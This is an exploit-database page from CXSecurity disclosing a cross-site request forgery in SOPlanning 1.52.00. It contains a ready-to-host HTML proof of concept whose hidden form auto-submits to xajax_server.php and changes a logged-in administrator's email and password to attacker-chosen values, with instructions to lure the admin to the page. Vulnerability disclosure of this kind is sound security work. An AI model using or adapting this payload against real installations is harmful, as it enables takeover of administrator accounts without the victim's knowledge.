---
title: SOPlanning 1.52.00 Cross Site Request Forgery
url: https://cxsecurity.com/issue/WLB-2024050007
source: CXSECURITY Database RSS Feed - CXSecurity.com
date: 2024-05-05
fetch_date: 2025-10-06T17:14:10.985845
---

# SOPlanning 1.52.00 Cross Site Request Forgery

[![Home Page](https://cert.cx/cxstatic/images/12018/cxseci.png)](https://cxsecurity.com/)

* [Home](https://cxsecurity.com/)
* Bugtraq
  + [Full List](https://cxsecurity.com/wlb/)
  + [Only Bugs](https://cxsecurity.com/bugs/)
  + [Only Tricks](https://cxsecurity.com/tricks/)
  + [Only Exploits](https://cxsecurity.com/exploit/)
  + [Only Dorks](https://cxsecurity.com/dorks/)
  + [Only CVE](https://cxsecurity.com/cvelist/)
  + [Only CWE](https://cxsecurity.com/cwelist/)
  + [Fake Notes](https://cxsecurity.com/bogus/)
  + [Ranking](https://cxsecurity.com/best/1/)
* CVEMAP
  + [Full List](https://cxsecurity.com/cvemap/)
  + [Show Vendors](https://cxsecurity.com/cvevendors/)
  + [Show Products](https://cxsecurity.com/cveproducts/)
  + [CWE Dictionary](https://cxsecurity.com/allcwe/)
  + [Check CVE Id](https://cxsecurity.com/cve/)
  + [Check CWE Id](https://cxsecurity.com/cwe/)
* Search
  + [Bugtraq](https://cxsecurity.com/search/)
  + [CVEMAP](https://cxsecurity.com/search/cve/)
  + [By author](https://cxsecurity.com/search/author/)
  + [CVE Id](https://cxsecurity.com/cve/)
  + [CWE Id](https://cxsecurity.com/cwe/)
  + [By vendors](https://cxsecurity.com/cvevendors/)
  + [By products](https://cxsecurity.com/cveproducts/)
* RSS
  + [Bugtraq](https://cxsecurity.com/wlb/rss/all/)
  + [CVEMAP](https://cxsecurity.com/cverss/fullmap/)
  + [CVE Products](https://cxsecurity.com/cveproducts/)
  + [Bugs](https://cxsecurity.com/wlb/rss/vulnerabilities/)
  + [Exploits](https://cxsecurity.com/wlb/rss/exploit/)
  + [Dorks](https://cxsecurity.com/wlb/rss/dorks/)
* More
  + [cIFrex](http://cifrex.org/)
  + [Facebook](https://www.facebook.com/cxsec)
  + [Twitter](https://twitter.com/cxsecurity)
  + [Donate](https://cxsecurity.com/donate/)
  + [About](https://cxsecurity.com/wlb/about/)

* [Submit](https://cxsecurity.com/wlb/add/)

|  |  |  |  |
| --- | --- | --- | --- |
|  |  | |  | | --- | | **SOPlanning 1.52.00 Cross Site Request Forgery** **2024.05.04**  Credit:  **[liquidsky](https://cxsecurity.com/author/liquidsky/1/)**  Risk: **Low**  Local: **No**  Remote: ****Yes****  CVE: **N/A**  CWE: **[CWE-352](https://cxsecurity.com/cwe/CWE-352 "Click to see CWE-352")** | |

<!--
Exploit Title: SOPlanning v1.52.00 'xajax\_server.php' CSRF (Account Takeover)
Application: SOPlanning
Version: 1.52.00
Date: 4/22/24
Exploit Author: Joseph McPeters (Liquidsky)
Vendor Homepage: https://www.soplanning.org/en/
Software Link: https://sourceforge.net/projects/soplanning/
Tested on: Linux
CVE: Not yet assigned
Description: SOPlanning v1.52.00 is vulnerable to CSRF via 'xajax\_server.php' a remote unautheticated attacker can hijack the admin account. The remote attacker can force the admins browser to make requests by sending them to an external page and update the admins password and email therefore taking over the admin panel.
Instructions: Host the exploit code included and have the admin visit the CSRF exploit page while logged in. It will be noticed that the password and email for the main admin have been changed to the specified email and password.
Liquidsky @ Specialized Security Services Inc. (S3) | Shout out to the team!
-->
<html>
<body>
<form action=https://fuzzlove.website/www/process/xajax\_server.php method="POST">
<input type="hidden" name="xajax" value="submitFormProfil" />
<input type="hidden" name="xajaxr" value="" />
<input type="hidden" name="xajaxargs&#91;&#93;" value="ADM" />
<!-- Update with attack email to change the admins email to yours -->
<input type="hidden" name="xajaxargs&#91;&#93;" value=pwn@mail.lv<mailto:pwn@mail.lv> />
<!-- Update the following field to change the admins password to the password in the field -->
<input type="hidden" name="xajaxargs&#91;&#93;" value="password" />
<input type="hidden" name="xajaxargs&#91;&#93;" value="fr" />
<input type="hidden" name="xajaxargs&#91;&#93;" value="true" />
<input type="hidden" name="xajaxargs&#91;&#93;" value="false" />
<input type="hidden" name="xajaxargs&#91;&#93;" value="true" />
<input type="hidden" name="xajaxargs&#91;&#93;" value="true" />
<input type="hidden" name="xajaxargs&#91;&#93;" value="true" />
<input type="hidden" name="xajaxargs&#91;&#93;" value="false" />
<input type="hidden" name="xajaxargs&#91;&#93;" value="0" />
<input type="hidden" name="xajaxargs&#91;&#93;" value="1" />
</form>
<script>
document.forms[0].submit();
</script>
</body>
</html>

[**See this note in RAW Version**](https://cxsecurity.com/ascii/WLB-2024050007)

[Tweet](https://twitter.com/share)

Vote for this issue:
 0
 0

50%

50%

#### **Thanks for you vote!**

#### **Thanks for you comment!** Your message is in quarantine 48 hours.

Comment it here.

Nick (\*)

Email (\*)

Video

Text (\*)

(\*) - required fields.
Cancel
Submit

|  |  |
| --- | --- |
|  | **{{ x.nick }}** ![]() | Date: {{ x.ux \* 1000 | date:'yyyy-MM-dd' }} *{{ x.ux \* 1000 | date:'HH:mm' }}* CET+1  ---   {{ x.comment }} |

Show all comments

---

Copyright **2025**, cxsecurity.com

|  |

Back to Top